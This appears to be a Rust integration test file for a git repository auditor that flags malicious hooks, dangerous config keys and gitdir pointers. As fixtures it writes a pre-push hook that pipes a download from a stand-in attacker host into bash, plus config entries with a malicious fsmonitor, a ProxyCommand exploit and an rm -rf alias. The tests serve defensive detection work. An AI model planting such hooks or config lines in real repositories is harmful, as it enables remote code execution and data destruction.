//! Dedicated integration tests for `m31a-trust` (src/git_armor.rs).
//!
//! Validates:
//! - Safe repository auditing when no hooks or configs exist
//! - Detection of active malicious hooks containing RCE payloads (`curl`, `wget`, `bash`)
//! - Identification of dangerous git configuration keys (`fsmonitor`, `sshCommand`, `alias` escapes)
//! - Audit trail for git submodules and worktree `gitdir` file pointers

use m31a_trust::git_armor::{ArmorVerdict, GitArmor, RiskSeverity};
use std::fs;
use tempfile::tempdir;

#[test]
fn test_git_armor_clean_repository() {
    let temp = tempdir().unwrap();

    // No .git at all
    let report_none = GitArmor::audit(temp.path());
    assert!(report_none.is_safe);
    assert_eq!(report_none.verdict, ArmorVerdict::Safe);
    assert_eq!(report_none.risks.len(), 0);

    // Empty .git directory
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();
    let report_empty = GitArmor::audit(temp.path());
    assert!(report_empty.is_safe);
    assert_eq!(report_empty.verdict, ArmorVerdict::Safe);
}

#[test]
fn test_git_armor_detects_malicious_hook_payloads() {
    let temp = tempdir().unwrap();
    let hooks_dir = temp.path().join(".git").join("hooks");
    fs::create_dir_all(&hooks_dir).unwrap();

    // 1. Harmless sample hook (ends with .sample, standard git default)
    fs::write(
        hooks_dir.join("pre-commit.sample"),
        b"#!/bin/sh\n# Sample hook\n",
    )
    .unwrap();
    let report_sample = GitArmor::audit(temp.path());
    assert!(report_sample.is_safe);

    // 2. Active executable hook with malicious payload
    let active_hook = hooks_dir.join("pre-push");
    fs::write(
        &active_hook,
        b"#!/bin/bash\ncurl -s https://evil-c2.attacker.com/payload | bash\n",
    )
    .unwrap();

    let report_malicious = GitArmor::audit(temp.path());
    assert!(!report_malicious.is_safe);
    assert_eq!(report_malicious.hooks_detected, 1);
    assert!(
        matches!(report_malicious.verdict, ArmorVerdict::Dangerous { critical_risks } if critical_risks >= 1)
    );
    assert!(
        report_malicious
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical && r.location == active_hook)
    );
}

#[test]
fn test_git_armor_detects_dangerous_git_config() {
    let temp = tempdir().unwrap();
    let git_dir = temp.path().join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    let config_path = git_dir.join("config");
    let malicious_config = r#"
[core]
	repositoryformatversion = 0
	filemode = true
	fsmonitor = "/usr/local/bin/malicious_fsmonitor"
	sshCommand = "ssh -o ProxyCommand=/tmp/exploit.sh"
[alias]
	evil = !rm -rf /tmp/data
"#;
    fs::write(&config_path, malicious_config).unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(!report.is_safe);
    assert!(report.custom_commands_detected >= 2);

    let titles: Vec<String> = report.risks.iter().map(|r| r.title.to_lowercase()).collect();
    assert!(titles.iter().any(|t| t.contains("fsmonitor")));
    assert!(titles.iter().any(|t| t.contains("sshcommand")));
    assert!(titles.iter().any(|t| t.contains("alias")));
}

#[test]
fn test_git_armor_submodule_gitdir_pointer() {
    let temp = tempdir().unwrap();
    let dot_git_file = temp.path().join(".git");

    // In a submodule or worktree, .git is a text file containing "gitdir: <path>"
    let external_git = temp.path().join("external_git");
    fs::create_dir_all(&external_git).unwrap();
    fs::write(
        &dot_git_file,
        format!("gitdir: {}\n", external_git.display()),
    )
    .unwrap();

    let report = GitArmor::audit(temp.path());
    assert!(
        report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Medium && r.title.contains("gitdir"))
    );
}
